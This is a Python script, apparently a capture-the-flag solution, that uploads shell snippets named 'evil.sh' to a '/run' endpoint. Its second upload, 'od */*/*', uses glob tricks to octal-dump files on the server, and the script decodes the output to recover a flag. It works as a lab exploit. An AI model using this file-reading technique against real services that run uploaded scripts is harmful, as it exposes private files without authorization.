import httpx
import os

BASE_URL = os.getenv("HOST", "http://localhost:3000")

client = httpx.Client(base_url=BASE_URL)

res = client.post(
    "/run",
    files={
        "file": (
            "evil.sh",
            b"cp /* */*/",
        ),
    },
)
assert res.text == "Error"

res = client.post(
    "/run",
    files={
        "file": (
            "evil.sh",
            b"od */*/*",
        ),
    },
)

flag = b""
for line in res.text[len("Result: ") :].splitlines():
    for part in line.strip()[8:].split(" "):
        if not part:
            continue
        flag += int(part, base=8).to_bytes(2, "little")
print(flag.decode())
